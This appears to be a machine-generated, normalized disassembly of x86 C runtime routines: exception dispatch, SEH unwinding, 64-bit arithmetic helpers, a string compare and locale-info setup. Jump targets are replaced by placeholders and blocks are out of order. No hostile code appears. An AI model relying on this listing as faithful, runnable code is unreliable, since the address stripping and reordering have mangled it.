mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_1008191e
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_10044649
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_10081963
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_1002f519
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_1006108c
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_10081a22
push 0x2c
push r--data
call sub_1007fb20
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_10002874
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_10044649
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_10044649
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_10044649
mov [ eax + 0x88 ] esi
call sub_10044649
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_10007971
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_10081b48
mov eax [ ebp - 0x1c ]
call sub_1007fb65
retn
sub_10081abb
mov esp [ ebp - 0x18 ]
call sub_10044649
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_10051c68
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_10081b48
mov eax [ ebp - 0x1c ]
call sub_1007fb65
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_10081b48
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_10044663
pop ecx
call sub_10044649
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_10044649
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_10045971
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_10059b63
pop ecx
pop ecx
sub_10081bbe
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1006cc18
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_10070f8e
call sub_10007ef1
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_10051c68
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_10081a22
add esp 0x28
test eax eax
je r-xdata
sub_10081c2c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_10044649
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_10044649
lea edi [ eax + 0x80 ]
call sub_10053997
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_1000b13a
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_1002f519
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_100574f2
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10081bbe
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_10081d33
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_1002f519
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_10044649
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1002f519
call sub_1004cfe6
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10081c2c
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_10044649
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_10044649
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_10044649
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_10027a63
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_1000b13a
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_1002f519
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_10059b63
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_10044649
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_10044649
mov edi [ eax + 0x94 ]
call sub_10044649
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_10081963
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_10081963
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_10060388
test al al
jne r-xdata
call sub_1002f519
cmp eax 0x19930522
jne r-xdata
call sub_10044649
call sub_10044649
call sub_10044649
mov [ eax + 0x88 ] esi
call sub_10044649
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_1006108c
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_10059b63
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_10069ac6
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_10024fe9
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_10081bbe
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_10007ef1
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_10051c68
add esp 0x10
push [ esi + 0x1c ]
call sub_100819d9
sub_100820b0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1008375c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1008375c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_100820fc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1007f940
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10007442
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1000b33e
pop ecx
cmp eax ebx
je r-xdata
call sub_10082ff0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_100821f0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_10082260
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_100822f0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10083765
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10083784
jmp r-xdata
sub_100822f0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10001e8b
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10082260
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10082352
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10082382
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100823c0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10082460
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10082494
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_1000932c
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
